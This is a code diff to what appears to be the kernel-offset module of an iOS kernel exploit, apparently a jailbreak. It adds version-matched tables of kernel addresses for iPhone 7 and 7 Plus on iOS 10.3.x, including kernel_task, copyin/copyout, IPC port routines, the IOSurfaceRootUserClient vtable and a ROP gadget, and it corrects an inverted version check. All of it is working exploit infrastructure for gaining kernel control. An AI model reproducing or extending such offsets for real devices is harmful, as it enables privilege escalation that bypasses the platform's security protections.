@@ -51,7 +51,7 @@ char *iPhone6plus_1032 = "Darwin Kernel Version 16.6.0: Mon Apr 17 17:33:35 PDT 
 char *iPhone6plus_1031 = "";
 
 char *iPhone6s_1033 = "";
-char *iPhone6s_1032 = "Darwin Kernel Version 16.6.0: Mon Apr 17 17:33:34 PDT 2017 root:xnu-3789.60.24~24/RELEASE_ARM64_S8000";
+char *iPhone6s_1032 = "Darwin Kernel Version 16.6.0: Mon Apr 17 17:33:34 PDT 2017; root:xnu-3789.60.24~24/RELEASE_ARM64_S8000";
 char *iPhone6s_1031 = "";
 
 char *iPhone6splus_1033 = "Darwin Kernel Version 16.7.0: Thu Jun 15 18:33:36 PDT 2017; root:xnu-3789.70.16~4/RELEASE_ARM64_S8000";
@@ -72,8 +72,8 @@ void load_offsets(void)
     struct utsname sysinfo;
     uname(&sysinfo);
     const char *kern_version = sysinfo.version;
-    
-    if(strcmp(kern_version, iPhone6s_1032))
+
+    if(!strcmp(kern_version, iPhone6s_1032))
     {
         OFFSET_ZONE_MAP                             = 0xfffffff007548478;
         OFFSET_KERNEL_MAP                           = 0xfffffff0075a4050;
@@ -89,8 +89,119 @@ void load_offsets(void)
         OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006e7c9f8;
         OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0064b1398;
     }
-    
-    LOG("loaded offsets for %s", kern_version);
+    if(!strcmp(kern_version, iPhone7_1031))
+    {
+      OFFSET_ZONE_MAP                             = 0xfffffff007590478;
+      OFFSET_KERNEL_MAP                           = 0xfffffff0075ec050;
+      OFFSET_KERNEL_TASK                          = 0xfffffff0075ec048;
+      OFFSET_REALHOST                             = 0xfffffff007572ba0;
+      OFFSET_BZERO                                = 0xfffffff0070c1f80;
+      OFFSET_BCOPY                                = 0xfffffff0070c1dc0;
+      OFFSET_COPYIN                               = 0xfffffff0071c6134;
+      OFFSET_COPYOUT                              = 0xfffffff0071c6414;
+      OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff0070df05c;
+      OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070f22b4;
+      OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070deb80;
+      OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006e49208 + 0x1030;
+      OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0064ff0a8;
+    }
+
+    if(!strcmp(kern_version, iPhone7_1032))
+    {
+      OFFSET_ZONE_MAP                             = 0xfffffff007590478;
+      OFFSET_KERNEL_MAP                           = 0xfffffff0075ec050;
+      OFFSET_KERNEL_TASK                          = 0xfffffff0075ec048;
+      OFFSET_REALHOST                             = 0xfffffff007572ba0;
+      OFFSET_BZERO                                = 0xfffffff0070c1f80;
+      OFFSET_BCOPY                                = 0xfffffff0070c1dc0;
+      OFFSET_COPYIN                               = 0xfffffff0071c6108;
+      OFFSET_COPYOUT                              = 0xfffffff0071c63e8;
+      OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff0070deff4;
+      OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070f22cc;
+        OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070deb18;
+      OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006e49208 + 0x1030;
+      OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0065000a8;
+
+    }
+
+    if(!strcmp(kern_version, iPhone7_1033))
+    {
+      OFFSET_ZONE_MAP                             = 0xfffffff007590478;
+      OFFSET_KERNEL_MAP                           = 0xfffffff0075ec050;
+      OFFSET_KERNEL_TASK                          = 0xfffffff0075ec048;
+      OFFSET_REALHOST                             = 0xfffffff007572ba0;
+      OFFSET_BZERO                                = 0xfffffff0070c1f80;
+      OFFSET_BCOPY                                = 0xfffffff0070c1dc0;
+      OFFSET_COPYIN                               = 0xfffffff0071c5db4;
+      OFFSET_COPYOUT                              = 0xfffffff0071c6094;
+      OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff0070deff4;
+      OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070f22cc;
+      OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070deb18;
+      OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006e49208 + 0x1030;
+      // OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0063c5398;
+      OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0064fb0a8;
+
+    }
+
+    if(!strcmp(kern_version, iPhone7plus_1031))
+    {
+      OFFSET_ZONE_MAP                             = 0xfffffff007590478;
+      OFFSET_KERNEL_MAP                           = 0xfffffff0075ec050;
+      OFFSET_KERNEL_TASK                          = 0xfffffff0075ec048;
+      OFFSET_REALHOST                             = 0xfffffff007572ba0;
+      OFFSET_BZERO                                = 0xfffffff0070c1f80;
+      OFFSET_BCOPY                                = 0xfffffff0070c1dc0;
+      OFFSET_COPYIN                               = 0xfffffff0071c6134;
+      OFFSET_COPYOUT                              = 0xfffffff0071c6414;
+      OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff0070df05c;
+      OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070f22b4;
+      OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070deb80;
+      OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006e49208 + 0x1030;
+      // OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0063c9398;
+      OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0064ff0a8;
+    }
+
+    if(!strcmp(kern_version, iPhone7plus_1032))
+    {
+      OFFSET_ZONE_MAP                             = 0xfffffff007590478;
+      OFFSET_KERNEL_MAP                           = 0xfffffff0075ec050;
+      OFFSET_KERNEL_TASK                          = 0xfffffff0075ec048;
+      OFFSET_REALHOST                             = 0xfffffff007572ba0;
+      OFFSET_BZERO                                = 0xfffffff0070c1f80;
+      OFFSET_BCOPY                                = 0xfffffff0070c1dc0;
+      OFFSET_COPYIN                               = 0xfffffff0071c6108;
+      OFFSET_COPYOUT                              = 0xfffffff0071c63e8;
+      OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff0070deff4;
+      OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070f22cc;
+      OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070deb18;
+      OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006e49208 + 0x1030;
+      // OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0063ca398;
+      OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0065000a8;
+
+    }
+
+    if(!strcmp(kern_version, iPhone7plus_1033))
+    {
+      OFFSET_ZONE_MAP                             = 0xfffffff007590478;
+      OFFSET_KERNEL_MAP                           = 0xfffffff0075ec050;
+      OFFSET_KERNEL_TASK                          = 0xfffffff0075ec048;
+      OFFSET_REALHOST                             = 0xfffffff007572ba0;
+      OFFSET_BZERO                                = 0xfffffff0070c1f80;
+      OFFSET_BCOPY                                = 0xfffffff0070c1dc0;
+      OFFSET_COPYIN                               = 0xfffffff0071c5db4;
+      OFFSET_COPYOUT                              = 0xfffffff0071c6094;
+      OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff0070deff4;
+      OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070f22cc;
+      OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070deb18;
+      OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006e49208 + 0x1030;
+      // OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0063c5398;
+      OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0064fb0a8;
+
+    }
+
+
+    LOG("%s", kern_version);
+    LOG("test offset x0x0x10gadget: %llx", OFFSET_ROP_ADD_X0_X0_0x10);
 }
 
 
